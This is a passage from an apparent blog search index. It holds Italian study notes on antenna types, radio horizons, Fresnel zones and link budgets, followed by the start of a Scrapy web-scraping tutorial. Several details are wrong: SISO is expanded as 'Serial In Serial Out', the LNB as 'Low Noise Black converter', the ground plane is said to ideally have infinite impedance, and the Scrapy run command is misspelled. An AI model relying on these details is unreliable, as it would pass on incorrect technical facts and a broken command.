tipolo in \\( \\lambda/2\\). É poi possibile intervenire sulla lunghezza o sulla sezione dell’antenna per modificare il diagramma di radiazione nel piano verticale, in modo da ottenere le caratteristiche desiderate in termini di lunghezza dell’antenna e quindi di praticitá nell’installazione.\n Dipolo in λ/2 E un’antenna a dipolo la cui lunghezza fisica ( \\(l\\) ) é pari a \\( \\lambda/2\\), dove \\( \\lambda\\) é la lunghezza d’onda del segnale (portante) impresso sull’antenna. Per questo motivio viene chiamato dipolo in \\( \\lambda/2\\) o dipolo a mezz’onda (half wave dipolo). La lunghezza fisica di un dipolo in \\( \\lambda/2\\) si calcola come:\n$$ \\Large\\textsf{}l_{fisica} = \\dfrac{\\lambda}{2} = \\dfrac{1}{2} \\frac{F_v * c}{f} \\space [m] $$\nDove:\n \\(c \\approx3 * 10^8 \\space m/s\\): velocitá di propagazione nel vuoto; \\(F_v\\): fattore di velocitá, tipicamente compreso fra \\(0,92\\) e \\(0,98\\); \\(f\\): frequenza (portante) del segnale che deve essere irradiato;  Anche per le antenne si definisce, infatti, un fattore di velocitá (\\(F_v\\)), quanto la velocitá di propagazione nel conduttore é minore di quella nel vuoto. Le principali caratteristiche di un dipolo \\( \\lambda/2\\) sono le seguenti:\n Il guadagno é pari a \\(G = 2,15\\) dBi; Nel piano \\(H\\) il diagramma di radiazione é un cerchio e quindi l’antenna é omnidirezionale; nel piano \\(H\\) l’intensitá del campo elettrico si puó determinare, ricordando la formula:  $$ \\Large\\textsf{}E = \\dfrac{60 * I}{r} \\space [V/m] $$\nDove:\n \\(I\\) (A): corrente nel punto di alimentazione; \\(r\\) (m): distanza dall’antenna;  Le altre caratteristiche:\n nel piano \\(E\\) l’antenna é direttiva, con un angolo di apertura pari a \\( \\theta = 78 \\degree\\); Nello spazio libero la resistenza di radiazione teorica é pari a \\(R_r = 73 \\spaceΩ\\); la resistenza d’antenna effettiva, varia al variare del rapporto \\( \\lambda/d\\) dove \\(d\\) é il diametro del conduttore, spesso, si inserisce un opportuno adattatore quando si collega l’antenna a un cavo coassiale con impedenza caratteristica \\(Z_0 = 50 \\space Ω\\);  Quando la frequenza dei segnali da trasmettere é relativamente bassa la lunghezza fisica di un dipolo \\( \\lambda/2\\) diventa rilevante. Sono state cosí realizzate antenne che consentono di avere lunghezze inferiori, come le seguenti: antenna Marconi o antenna in \\( \\lambda/4\\), Ground Plane, antenne caricate.\n Antenna Marconi L’antenna Marconi (o antenna a \\( \\lambda/4\\) ) é un’antenna che dimezza la lunghezza dell’elemento radiante rispetto al dipolo \\( \\lambda/2\\), essa é montata verticalmente e connessa a terra attraverso il generatore che lo alimenta; questa antenna sfrutta la terra come superficie conduttrice riflettente.\nIl suo funzionamento si basa sul principio delle immagini il quale afferma che il campo prodotto da una carica posta nelle vicinanze di un piano conduttore equivale al campo nel caso in cui vi fosse una carica di segno opposto, simmetrica rispetto al piano e detta carica immagine.\nÉ possibile sostituire un semidipolo con un piano conduttore, che puó anche essere il terreno. Supponendo la terra sia un perfetto conduttore, essa produce lo stesso effetto di un semidipolo immagine, e quindi nella porzione di spazio che contiene l’antenna reale si ottiene un diagramma di radiazione analogo a quello di un dipolo \\( \\lambda/2\\).\nLe caratteristiche fondamentali di un’antenna \\( \\lambda/4\\) sono:\n  L’antenna é omnidirezionale nel piano \\(H\\), in cui il diagramma di radiazione é un cerchio;\n  Il diagramma di radiazione nel piano \\(E\\) é pari alla metá superiore di quello del dipolo \\( \\lambda/2\\);\n  Il guadagno aumenta di \\(3 dB\\) e diventa pari a:\n$$ \\Large\\textsf{}G = 3 dBd \\implies G = 5,15 dBi $$\n  La resistenza di radiazione si dimezza e per un’antenna filiforme diventa pari a \\(R_r = 36,5 Ω\\), in quanto l’antenna é costituita da un semidipolo.\n  L’antenna Marconi trova impiego prevalentemente nelle trasmissioni a frequenza relativamente bassa, in onde lunghe (LF) e onde medie (MF). Per ottenere un piano conduttore di caratteristiche migliori rispetto alla terra si stende sotto l’antenna, una maglia di fili di rame intrecciati, nota come contrappeso (counterpoise).\n Antenna Ground Plane Un\u0026rsquo;antenna Ground Plane è un tipo di antenna a dipolo in cui la radiazione avviene grazie all\u0026rsquo;assenza di una sezione del dipolo, sostituita da un piano di massa o \u0026ldquo;ground plane\u0026rdquo;. Questo piano di massa, a forma di piatto o di disco, si trova sotto l\u0026rsquo;antenna e serve come elemento di ritorno per il segnale radio.\nIn un\u0026rsquo;antenna Ground Plane ideale, il piano di massa avrebbe un\u0026rsquo;impedenza infinita e sarebbe perfettamente orizzontale rispetto all\u0026rsquo;antenna, formando un angolo di 90 gradi rispetto alla direzione di emissione del segnale. In realtà, tuttavia, il piano di massa ha una resistenza finita e non è mai completamente orizzontale, il che può influire sulle prestazioni dell\u0026rsquo;antenna.\nPer quanto riguarda i valori resistivi, la resistenza del piano di massa dipende dal materiale utilizzato, dalle dimensioni e dalla forma. Solitamente si cerca di utilizzare materiali con alta conduttività, come il rame o l\u0026rsquo;alluminio, per minimizzare la resistenza. Tuttavia, la resistenza del piano di massa può comunque variare a seconda delle condizioni ambientali, come la presenza di umidità o di contaminanti.\nL\u0026rsquo;angolo formato dal piano di massa dipende dalla geometria dell\u0026rsquo;antenna e dalle esigenze di progetto. In generale, l\u0026rsquo;angolo deve essere tale da massimizzare il guadagno dell\u0026rsquo;antenna nella direzione di emissione del segnale e minimizzare il guadagno nelle direzioni indesiderate. Solitamente, l\u0026rsquo;angolo varia tra i 30 e i 60 gradi rispetto all\u0026rsquo;orizzontale.\n Antenne Caricate Le antenne caricate sono antenne che utilizzano un\u0026rsquo;induttanza o un condensatore per modificare le loro proprietà elettriche, in modo da adattarsi meglio alle specifiche esigenze di progetto. La carica, che è una reattanza, può essere utilizzata per vari scopi, come la riduzione delle dimensioni dell\u0026rsquo;antenna, la regolazione dell\u0026rsquo;impedenza di ingresso o la focalizzazione della radiazione in determinate direzioni.\nAd esempio, un\u0026rsquo;antenna a filo rettilineo lunga a λ/4 può essere carica in modo da apparire come un\u0026rsquo;antenna più corta, ma con le stesse proprietà elettriche. Ciò consente di ottenere una riduzione delle dimensioni fisiche dell\u0026rsquo;antenna, senza comprometterne le prestazioni.\nInoltre, le antenne caricate possono essere utilizzate per adattare l\u0026rsquo;impedenza di ingresso dell\u0026rsquo;antenna alla sorgente del segnale. Questo può essere utile, ad esempio, quando l\u0026rsquo;antenna è collegata a un amplificatore o a un ricevitore con un\u0026rsquo;impedenza diversa da quella dell\u0026rsquo;antenna. In questo caso, l\u0026rsquo;antenna viene carica in modo da presentare un\u0026rsquo;impedenza di ingresso compatibile con quella della sorgente del segnale.\nInfine, le antenne caricate possono essere utilizzate per focalizzare la radiazione in determinate direzioni. Ciò può essere ottenuto utilizzando carichi di induttanza o di capacità in modo selettivo, in modo da modificare la distribuzione della corrente lungo l\u0026rsquo;antenna e quindi la direzione di emissione del segnale.\nIn sintesi, le antenne caricate sono un\u0026rsquo;importante tecnologia che consente di adattare le proprietà elettriche delle antenne alle specifiche esigenze di progetto, per ottenere prestazioni ottimali in diverse applicazioni.\n Dipolo ripiegato (folded dipole) e antenne a banda larga Un’altra variante del dipolo \\( \\lambda/2\\) é costituita dal dipolo ripiegato (folded dipole). Quest’antenna realizzata congiungendo gli estremi di un dipolo \\( \\lambda/2\\) con un conduttore parallelo a esso per simulare un dipolo \\( \\lambda/2\\) avente un diametro del conduttore piú grande.\nPoiché la banda di un dipolo aumenta con l’aumentare del diametro del conduttore, il dipolo ripiegato é un’antenna a banda larga utilizzata come elemento base delle antenne riceventi TV.\nIl guadagno rimane lo stesso del dipolo \\( \\lambda/2\\), la resistenza di radiazione quadruplica arricando a circa \\(R_r = 300 Ω\\). Questa antenna puó essere usata da sola oppure puó costituire l’elemento radiante di antenne piú complesse, come le antenne riceventi TV di tipo Yagi.\n Antenne direttive Un’antenna che concentra la maggior parte della potenza irradiata lungo una direttrice ben precisa, viene definita direttiva unidrezionale, o piú semplicemente direttiva.\nLe antenne direttive hanno le seguenti caratteristiche salienti:\n Guadagno piú alto; Non irradiano nelle aree che non interessa servire; L’antenna é adatta per collegamenti di tipo punto-punto;  Un parametro importante per le antenne direttive é l’FBR (Front-to-Back Ratio), che ne definisce il grado di unidirezionalitá. Piú alto é l’FBR e maggiore sará l’unidirezionalitá dell’antenna.\nDiagramma di radiazione di un’antenna direttiva undirezionale Yagi:\n Angolo di apertura del fascio (beamwidth) o angolo di radiazione Viene definito angolo di apertura a 3 dB (beamwidth), o angolo di radiazione di un’antenna (\\( \\theta\\) ), l’angolo indiviato dai due punto sul diagramma di radiazione in cui il grafico diminuisce di 3 dB rispetto al valore che si ha nella direzione di massimo irraggiamento.\nNelle due direzioni individuate dall’angolo \\( \\theta\\) la densitá di potenza, \\(S\\), si dimezza, rispetto al valore nella direzione di massimo irraggiamento, e di conseguenza il campo elettrico, \\(E\\), diviene pari a \\(E = E_{max \\space IRR} / \\sqrt{2}\\).\n Front-to-Back Ratio (rapporto avanti/dietro) Il Front-to-Back Ratio (FBR), o rapporto avanti/dietro, esprime il grado di unidrezionalitá di un’antenna direttiva.\nL’FBR é espresso in decibel ed é pari alla differenza tra il guadagno (normalizzato) nella direzione di massima irradiazione (\\( 0\\degree\\)) e il guadagno (normalizzato) che si ha nella direzione opposta (a \\(180\\degree\\)gradi):\n$$ \\Large\\textsf{}FBR = G (0\\degree) - G (180\\degree) $$\n Antenna Yagi Un’antenna direttiva puó essere realizzata affiancando a un dipolo \\( \\lambda/2\\) degli elementi passivi. Un elemento passivo é un conduttore, avente lunghezza appropriata, che viene posta nelle immediate vicinanze dell’elemento radiante. L’elemento passivo intercetta una parte dell’energia irradiata e a sua volta la reirradia.\nL’antenna Yagi é composta da:\n Un elemento attivo costituito da un dipolo \\( \\lambda/2\\) Un elemento passivo detto riflettore, avenete lunghezza maggiore di \\( \\lambda/2\\) che riflette le onde elettromagnetiche nella direzione desiderata; Uno o piú elementi passivi, detti direttori, che hanno lunghezza minore di \\( \\lambda/2\\) i quali concentrano la potenza irradiata nella direzione desiderata.  Facendo un’analogia ottica, il riflettore si comporta come uno specchio, mentre i direttori si comportano come delle lenti convergenti.\nL’antenna Yagi é molto utilizzata come antenna ricevenete TV. Il riflettore tubolare puó essere sostituito da un riflettore formato da un diedro di materiale condutttore, sulla cui bisettrice viene posto il dipolo attivo. Si realizza cosí l’antenna a diedro o corner riflector.\n Antenna collineari e a cortina Un modo per aumentare la direttivitiá e il guadagno di un’antenna é quello di utilizzare sistemi radianti costituiti da un certo numero ($N$) di dipoli \\( \\lambda/2\\) allineati e alimentati. Se i dipoli sono disposti sullo stesso asse si ottiene un’antenna collineare o allineamento (array) collineare, mentre se i dipoli sono disposti a matrice su un piano si ottiene una cortina di dipoli.\nIn tal modo il guadagno rispetto al dipolo \\( \\lambda/2\\), espresso in dBd, diventa pari a \\(G = 10\\log_{10}N d Bd\\).\n Puntamento delle antenne direttive Nel caso di collegamenti che impiegano antenne direttive, é importante conoscere il diagramma di radiazione per poter puntare correttamente l’antenna, cioé per posizionarla nella direzione in cui l’antenna capta meglio. Un errato puntamento dell’antenna causa una diminuzione del segnale fornito in uscita dall’antenna stessa, che puó anche annullarsi.\n Antenne a superficie Quando si opera nel campo delle microonde (UHF, SHF, EHF) le onde radio possono essere considerate come dei raggi che é possibile riflettere e focalizzare tramite superfici di forma e materiale opprtuni.\n Antenna parabolica Nel campo dell’illuminazione per ottenere uno stretto fascio luminoso é possibile utilizzare riflettori parabolici, ponendo una sorgente luminosa nel punto focale di una superficie riflettente a forma di paraboloide.\nSe l’irradiazione di una sorgente, posta nel punto focale, viene riflessa da una superficie costituita da un paraboloide, la potenza irradiata viene concentrata in un fascio molto stretto lungo la direzione di propagazione, ottenendo cosí un elevato guadagno.\nI diagrammi di radiazione nei piani \\(H\\) ed \\(E\\) mostrano un lobo principale molto pronunciato, con un angolo di apertura molto piccolo, che denota un elevato guadagno.\nPer il principio di reciprocitá l’antenna conserva le sue proprietá anche quando viene usata come antenna ricevente. Il guadagno delle antenne paraboliche arriva a valori molto alti, anche 60 dB per antenne di grandi dimensioni.\nL’illuminazione della superficie parabolica, cioé l’irradiazione delle onde elettromagnetiche verso la superficie riflettente, puó essere realizzata in vari modi:\n Un’antenna vera e propria posta nel fuoco della parabola; Una guida d’onda tronca o terminata a tromba posta nel fuoco della parabola;  L’illuminazione non é uniforme, ma decresce verso i bordi, l’illuminatore tende a illuminare meglio il centro. Per questo motivo si definisce l’efficienza, \\( \\eta\\), di un’antenna parabolica come il rapporto tra l’area equivalente ( \\(A_{eq}\\) ), o area efficace e l’area geometrica ( \\(A_g\\) ) dell’antenna in esame: \\( \\eta = A_{eq} / A_g\\). Normalmente si ha \\(0,5 \u0026lt; \\eta \u0026lt; 0,8\\); in mancanza di dati certi si puó assumere il valore tipico \\( \\eta = 0,65\\).\nIl guadagno di una antenna parabolica dipende dalla sua efficienza, dal suo diametro ( \\(D_a\\) ) e dalla lughezza d’onda del segnale captato o irradiato secondo la seguente relazione:\n$$ \\Large\\textsf{}G = 10 \\log_{10} \\eta \\begin{pmatrix} \\dfrac{\\pi * D_a}{\\lambda} \\end{pmatrix}^2 ; [dB] $$\nL’angolo di apertura a 3 dB (beamwidth) di un’antenna parabolica si puó calcolare come:\n$$ \\Large\\textsf{}\\theta\\degree \\approx 70 \\dfrac{\\lambda_{[m]}}{D_{a[m]}} $$\n Parabola offset Le parabole che hanno l’illuminatore nel fuoco vengono denominate prime focus. Per limitare le interferenze sono state realizzate parabole denominate offset le quali sono costituite da una sezione di un paraboloide che punta verso un illuminatore posto nel fuoco, il quale però non è al centro dell’antenna bensì in posizione sottostante.\n Antenne paraboliche per la ricezione TV da satellite L’antenna parabolica costituisce un’antenna direttiva ad alto guadagno utilizzata anche per la ricezione di segnali TV da satellite (sistema DVB-S, Digital Video Broadcasting-Satellite).\nIn questo caso sia perché l’intensità del segnale ricevuto è estremamente debole, sia perché la frequenza del segnale ricevuto è molto elevata, viene montato direttamente sulla parabola un dispositivo denominato LNB (Low Noise Black converter), collegato all’antenna ricevente vera e propria e a un polarizzatore, per discriminare il segnale in base alla sua polarizzazione.\nL’LNB è composto fondamentalmente da tre parti:\n LNA (Low Noise Amplifer): è un amplificatore che eleva il livello del segnale RF ricevuto; Mixer o down converter: ha il compito di abbassare la frequenza del segnale captato portandola dalla radio frequenza a una frequenza detta frequenza intermedia (FI); Filtro passa banda e amplificatore a FI: per eliminare le frequenze indesiderate e amplificare il segnale a FI prima di inviarlo sul cavo coassiale;   Parabola Cassegrain È un tipo di antenna parabolica, che ha un diverso sistema di illuminazione, l’illuminatore, costituito da una guida d’onda tronca (feed horn), è posto al centro della parabola e punta su una superficie riflettente secondaria, denominata subriflettore, avente la forma di un iperboloide di rotazione, in questo modo si ottiene un’illuminazione più uniforme.\n Sistemi di antenna MIMO(Multiple In Multiple Out) In alta frequenza, i sistemi d’antenna possono impiegare una o piú antenne e possono essere suddivisi nei seguenti sistemi:\n SISO (Serial In Serial Out): sono i sistemi che utilizzano un’antenna lato trasmissione e un’antenna lato ricezione; sono sistemi adatti a operare quando l’ambiente é assimilabile allo spazio libero. SIMO (Serial In Multiple Out): sono i sistemi che operano lato ricezione con due antenne riceventi, per implementare la tecnica della diversitá di spazio; sono adatti a operare quando il ricevitore é posto in un ambiente in cui vi sono oggetti che causano riflessioni. MISO (Multiple In Serial Out): sono un’alternativa ai sistemi SIMO, in cui si utilizzano due antenne trasmittenti e un’antenna ricevente. MIMO (Multiple In Multiple Out): sono i sistemi piú moderni che utilizzano contemporaneamente due o piú antenne in trasmissione e due o piú antenne in ricezione. Sono sistemi che trasmettono e ripartiscono il flusso di bit in ingresso su piú segnali modulati inviati in parallelo alle antenne trasmittenti; i segnali vengono captati dalle antenne riceventi e con sofisticate tecniche di elaborazione digitale dei segnali (DSP) sono demodulati e viene riassemblato il flusso id bit originario; i sistemi MIMO consentono di aumentare la capacitá trasmissiva di un sistema all’aumentaredel minimo tra (m, n), dove m é il numero di antenne usate in trasmissione e n é il numero di antenne usate in ricezione; possono operare in maniera piú efficace in ambienti in cui vi sono molte riflessioni in quanto sono in grado di compensare le differenze di fase fra i vari percorsi e quindi di sfruttare positivamente i segnali riflessi. I sistemi MIMO sono impiegati nei sistemi di comunicazione radio piú moderni; apparati WiFi (802.11n), sistemi di accesso wireless a banda larga (WiMAX), sistemi per la comunicazione in mobilitá di ultima generazione (LTE, Long Term Evolution).   Installazione dei sistemi di antenna Quando si opera a frequena elevate (bande VHF/UHF/SHF) le onde elettromagnetiche si propagano per onda diretta, propagazione detta anche in visibilitá ottica (Line Of Sight - LoS).\nQuesto tipo di propagazione richiede che le antenne tramittenti e riceventi siano (quasi) visibili l’una all’altra, in quanto le onde elettromagnetiche viaggiano direttamente dall’antenna trasmittente all’antenna ricevente.\nNello spazio libero i percorsi seguiti sarebbero rettilinei, mentre nell’atmosfera essi risentono delle disomogeneitá del mezzo.\nIn condizioni normali (atmosfera standard) le disomogeneitá causano delle rifrazioni facendo sí che il percorso seguito da un’onda elettromagnetica sia all’incirca un arco di cerchio.\nIn situazioni anomale si possono avere rifrazioni diverse, fenomi di riflessione, diffrazioni e assorbimento, che causano ulteriori perdite. Tali fenomeni avvegono nella troposfera in quanto la stratosfera e la ionosfera a queste frequenze si possono considerare sostanzialmente simili allo spazio libero.\nI calcoli relativi all’installazione e al posizionamento delle antenne sono semplificati se si considerano i percorsi come rettilinei. a tale scopo si tiene conto del fatto che in realtá i percorsi sono archi di cerchio, introducendo cosí il concetto di terra equivalente.\nLa terra equivalente é una superficie terrestre fittizzia in cui si possono considerare i percorsi delle onde elettromagnetiche come rettilinei.\nIl raggio della terra equivalente si ottiene moltiplicando il raggio effettivo della terra per un fattore $k$ (effective earth radius factor), che per l’atmosfera standard vale \\(k = 4/3 \\approx 1,33\\), per cui si ha \\(R_{eq} = k * R_0 = 4/3 * 6367 \\approx 8490\\) km.\n Orizzonte radio e massima distanza fra due antenne L’orizzonte radio di un’antenna trasmittente, posta a un’altezza \\(h_{TX}\\) (m) dal suolo, é la massima distanza, \\(d_{TX}\\) (in km) a cui l’altezza é in visibilitá radio con un’antenna posta a livello del suolo.\nIn un ambiente privo di ostacoli l’orizzonte radio risulta pari a:\n$$ \\Large\\textsf{}d_{TX} \\approx 4,12 \\sqrt{h_{TX [m]}} ; [km] $$\nL’orizzonte radio é piú grande dell’orizzonte visivo in quanto le onde elettromagnetiche compiono dei percorsi che sono archi di cerchio.\nIn un ambiente privo di ostacoli la massima distanza \\(d_{max}\\) é pari alla somma degli orizzonti radio e si puó calcolare come:\n$$ \\Large\\textsf{}d_{max} = d_{TX} + d_{RX} \\approx 4,12 (\\sqrt{h_{TX_[m]}} + \\sqrt{h_{RX_[m]}}) ; [km] $$\nQuando le condizioni dell’atmosfera non sono quelle standard varia la curvatura della traiettoria del raggio. Si definiscono cosi le seguenti due condizioni:\n subrifrazione, quando \\(k \u0026lt; 4/3\\) e la curvatura é inferiore rispetto alla condizione standard; l’onda elettromagnetica (raggio) devia verso l’alto rispetto alla traiettoria standard; superrifrazione, quando \\(k \u0026gt; 4/3 \\); la curvatura é maggiore di quella standard; l’onda elettromagnetica (raggio) devia verso il basso rispetto alla traiettoria standard.  Queste situazioni possono comportare una diminuzione anche forte della potenza di segnale che giunge all’antenna ricevente e si configurano come una forma di fading.\n Perdite per diffrazione e prima zona di Fresnel Quando in un collegamento radio il terreno (o un ostacolo di dimensione \u0026raquo; \\( \\lambda\\) ) risulta vicino alla linea fittizzia che congiunge l’antenna trasmittente con quella ricevente intervengono fenomeni di diffrazione che riducono la potenza del segnale ricevuto.\nLa maggior parte della potenza giunge all’antenna ricevente viaggia in una zona dello spazio denominata prima zona di Fresnel, individuata da un eliissoide di ratoazione detto ellisoide di Fresnel.\nIl raggio massimo dell’ellissoide di Fresnel si ha quando \\(d_1 = d_2 = d/2\\), il raggio massimo dell’ellissoide di Fresnel risulta pari a:\n$$ \\Large\\textsf{}r_{max} = 8,66 \\sqrt{\\dfrac{d_{km}}{f_{GHz}}} ; [m] $$\nLe perdite per diffrazione sono trascurabili solo se la prima zona di Fresnel risulta libera da ostacoli. Quindi l’altezza delle torri o dei tralicci viene calcolata imponendo che eventuali ostacoli risultino posti a distanze maggiori di \\(r_{max}\\).\n Dimensionamento di un collegamento radio È necessario fare il bilancio di potenza di un collegamento, o link (power) budget, per calcolare qual è il livello di potenza che si fornisce in ingresso al primo amplificatore in ricezione.\n Bilancio di potenza (link budget) di un collegamento radio Il bilancio di potenza di un collegamento radio è una relazione matematica che lega il livello di potenza con cui opera il trasmettitore al livello di potenza che si ha in ingresso al ricevitore, sommando tutti i guadagni e sottraendo tutte le attenuazioni che sono presenti fra uscita del trasmettitore e ingresso del ricevitore:\n$$ \\Large\\textsf{}L_{PRX} = L_{PTX[dBm \\ (o \\ dBW)]} + \\sum Guadagni_{[dB]} - \\sum Attenuazioni_{[dB]} ; dBm\\ (o \\ DBW) $$\nSpesso si preferisce spezzare il bilancio di potenza in due parti:\n Calcolo dell’EIRP del sistema tramittente, sottraendo al livello di potenza del trasmettitore ( \\(L_{PTX}\\) ) l’attenuazione del feeder (cavo) \\(A_F\\) in dB, e sommando il guadagno dell’antenna trasmittente ( \\(G_T\\) in dBi); Si calcola il livello in ricezione sottraendo all’EIRP l’attenuazione del collegamento radio, tenendo conto dell’attenuazione dello spazio libero ( \\(A_{sl}\\) ) dell’eventuale attenuazione supplementare (\\( A_{suppl}\\) ), sommando il guadagno dell’antenna ricevente e sottranendo l’attenuazione dell’eventuale feeder (cavo), \\(A_F\\).  $$ \\begin{cases} EIRP = L_{PTX[dBm \\ (o \\ dBW)]} - A_{F[dB]} + G_{T[dB]} \\ dBm \\ (o \\ dBW) \\newline L_{PRX} = EIRP - [A_{sl} + A_{suppl} + M_L] + G_R - A_F ; dBm \\ (o \\ dBW) \\end{cases} $$\n Calcolo del livello in ricezione Per calcolare il livello in ricezione si procede nel seguente modo:\n  Determiniamo l’EIRP del sistema trasmittente.\n  Calcoliamo il livello di potenza del trasmettitore esprimendo la potenza in \\( mW \\) e applicando la relazione:\n$$ \\Large\\textsf{}L_{PTX} = 10\\log_{10} \\ P_{TX[mW]} [dBm] $$\n  Calcoliamo l’attenuazione del cavo coassiale (feeder), l’attenuazione per unità di lunghezza (\\( \\alpha \\)) e la sua lunghezza ( \\(l\\) ) come:\n$$ \\Large\\textsf{}A_F = \\alpha * l [dB] $$\n  Noto il tipo di antenna e le sue caratteristiche si determina il guadagno ( \\(G_T\\), in \\(dBi\\), o semplicemente in $dB$ per le antenne paraboliche).\n  Si calcola l’EIRP:\n$$ \\Large\\textsf{}EIRP = L_{PTX [dBm]} - A_{F[dB]} + G_{T[dB]} [dBm] $$\n    Determiniamo l’attenuazione del collegamento radio.\n  Calcoliamo l’attenuazione dello spazio libero ( \\(A_{sl}\\) ) e la distanza fra le antenne \\((r)\\) in km:\n$$ \\Large\\textsf{}A_{sl} = 32,5 + 20\\log_{10} f_{MHz} + 20\\log_{10} ; r_{km} [dB] $$\nSe si opera a frequenze elevate, si dovrebbe verificare che l’altezza sia sufficiente per fornire la visibilitá radio fra le antenne.\n  Stimiamo l’attenuazione supplementare ( \\(A_{suppl}\\) ); indicativamente in ambiente aperto e in situazioni meteo favorevoli l’attenuazione supplementare é trascurabile per frequenze inferiori ai \\(10 GHz\\), \\(0,02 dB/km\\) a circa \\(0,2 dB/km\\) fino a \\(40 GHz\\).\n  Si introduce un margine del collegamento, o margine di link (\\(M_L\\)) per tener conto dell’aumento di attenuazione che si potrebbe avere in determinate condizioni atmosferiche. \\(M_L\\) é legato alla frequenza di trasmissione e alla disponibilitá che si desidera ottenere per il collegamento.\nNei collegamenti terrestri si puó aggiungere nel margine di link anche un margine contro i fading (margine di fading, \\(M_F\\)).\n    Determiniamo il livello di potenza in ingresso al ricevitore.\n  Noto il tipo di antenna ricevente e le sue caratteristiche se ne determinina il guadagno (\\(G_g\\), in dBi, o dB per le antenne paraboliche).\n  Si calcola l’attenuazione del feeder in ricezione.\n  Si calcola il livello di potenza in ingresso al ricevitore:\n$$ \\Large\\textsf{}L_{PRX} = EIRP - [A_{SL} + A_{suppl} + M_L] + G_R - A_{FRX} dBm $$\n    Si verifica che il livello in ricezione sia almeno pari alla sensibilitá del ricevitore affinché il sistema fornisca in uscita un segnale con livello e qualitá accettabile:\n$$ \\Large\\textsf{}L_{PRX_[dBm] } \\geq S_{RX_[dBm]} $$\n  Utilizzando la stessa metedologia é possibile, variando i dati, determinare un’incognita diversa:\n Distanza massima del collegamento Guadagno che deve avere l’antenna ricevente Margine di link che si ha   Fading delle Antenne Il fenomeno del fading delle antenne si riferisce alla perdita di intensità del segnale radio quando viene trasmesso da un\u0026rsquo;antenna e ricevuto da un\u0026rsquo;altra. Questo può accadere a causa di diverse ragioni, tra cui l\u0026rsquo;effetto della riflessione, la diffrazione e l\u0026rsquo;assorbimento delle onde radio.\nIn particolare, il fading può essere causato dalla riflessione delle onde radio su superfici come edifici, alberi o montagne, che possono creare zone di attenuazione o interferenza nel segnale radio. Inoltre, il fading può essere causato dalla diffrazione, cioè dalla deviazione del segnale radio quando incontra ostacoli come angoli, spigoli o superfici curve.\nIl fading può anche essere causato dall\u0026rsquo;assorbimento delle onde radio da parte di materiali come acqua, pioggia, neve o aria umida. In questo caso, la quantità di energia del segnale radio diminuisce man mano che attraversa questi materiali, causando un attenuamento del segnale.\nIl fading può essere ridotto utilizzando tecniche come l\u0026rsquo;uso di antenne direzionali, la diversità di antenna e la modulazione adattiva, che possono aiutare a migliorare la qualità del segnale radio e ridurre la perdita di intensità.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/appunti-sulle-antenne/antenne/","tags":["Telecomunicazioni","Antenne","Elettronica"],"title":"Appunti sulle Antenne"},{"categories":["Tutorial"],"contents":" Table Of Contents:\n Introduzione al modulo Esempi Pratici  Estrazione del titolo di una pagina web Estrazione dei prezzi dei libri da una pagina web Estrazione di tutte le informazioni sui libri da una pagina web Estrazione di tutte le informazioni sui libri da più pagine web Estrazione di informazioni sui libri da una pagina web utilizzando un\u0026rsquo;espressione regolare Estrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV Scraping di dati da più siti Scraping di dati da una pagina con autenticazione Scraping di dati da una pagina AJAX Scraping di dati da una pagina utilizzando una sessione Scraping di tutti i prezzi dei libri su tutte le pagine Scraping di tutti i titoli e le categorie dei libri Scraping delle immagini dei libri Scraping dei prezzi dei libri in un formato specifico (es. JSON)     Introduzione al modulo Scrapy è un modulo Python open-source per il web scraping. È stato progettato per estrarre i dati da siti web in modo efficiente e rapido. Scrapy offre una serie di funzionalità avanzate per il web scraping, tra cui la gestione delle richieste, la navigazione del sito, la selezione dei dati tramite XPath o CSS selector e la gestione dei cookie.\nIl modulo Scrapy utilizza una struttura ad albero per rappresentare il contenuto di una pagina web. Ciò consente agli sviluppatori di selezionare facilmente i dati desiderati utilizzando i selettori CSS e XPath. Inoltre, Scrapy fornisce una serie di metodi per navigare il sito web come segue: seguire i link, inviare form e gestire i cookie.\nScrapy è anche progettato per essere utilizzato in modo scalabile, è in grado di gestire grandi quantità di dati e di supportare il parallelismo. Il modulo supporta anche la persistenza dei dati, consentendo di salvare i dati estratti in un formato specifico, come CSV, JSON o XML.\nPer creare un progetto con Scrapy, è necessario creare un nuovo progetto utilizzando il comando scrapy startproject, quindi creare un nuovo spider utilizzando il comando scrapy genspider. In seguito si definiscono le regole di scraping nella funzione parse() del proprio spider.\nIn sintesi Scrapy è uno strumento molto potente per estrarre i dati dal web, grazie alla sua flessibilità e alle sue funzionalità avanzate, è possibile creare spider in grado di estrarre dati da siti web complessi e navigare attraverso più pagine.\n Disclaimer: ⚠️ Il web scraping è una pratica legale a meno che non violi le condizioni d\u0026rsquo;uso del sito web in questione. Il presente software è stato creato per scopi educativi e di ricerca e non deve essere utilizzato per violare le leggi o i termini d\u0026rsquo;uso di un sito web. L\u0026rsquo;utente è responsabile dell\u0026rsquo;utilizzo del software e degli eventuali danni causati dall\u0026rsquo;utilizzo improprio. ⚠️\n Per installare e configurare uno progetto con il modulo scrapy possiamo usare i seguenti step:\nInstallare Scrapy: è possibile farlo utilizzando il comando seguente nella riga di comando:\npip install scrapy Oppure per Python3:\npip3 install scrapy Creare un nuovo progetto: Per creare un progetto è possibile utilizzare il comando nella riga di comando:\nscrapy startproject \u0026lt;nome_progetto\u0026gt; Dove \u0026lt;nome_progetto\u0026gt; è il nome del progetto che si desidera creare. Questo comando creerà una nuova cartella con il nome del progetto, che conterrà i file di configurazione e la struttura del progetto.\nCreare un nuovo spider: utilizzare il comando seguente nella riga di comando:\nscrapy genspider \u0026lt;nome_spider\u0026gt; \u0026lt;dominio\u0026gt; Dove \u0026lt;nome_spider\u0026gt; è il nome del spider che si desidera creare e  è il dominio del sito web da cui si desidera estrarre i dati. Questo comando creerà un nuovo file spider nella cartella \u0026ldquo;spiders\u0026rdquo; del progetto. Il comando richiede il nome dello spider e l\u0026rsquo;URL di partenza per lo spider. Esempio:\nscrapy genspider example example.com Questo creerà un file chiamato example.py all\u0026rsquo;interno della cartella spiders del tuo progetto, con una classe di spider chiamata ExampleSpider che inizia a estrarre i dati dall\u0026rsquo;URL example.com.\nUna volta creato lo spider, è possibile modificare il codice per soddisfare le esigenze del progetto. In seguito, lo spider può essere eseguito utilizzando il comando:\nscrapy spiderun \u0026lt;nome_spider\u0026gt;.py Extra: ExampleSpider è il nome della classe dello spider generato automaticamente dal comando scrapy genspider con il nome che gli hai dato quando hai creato lo spider.\nLa classe estende la classe base scrapy.Spider e include una serie di proprietà e metodi predefiniti che puoi utilizzare per configurare e eseguire lo spider.\nPer esempio, nella classe è presente il nome dello 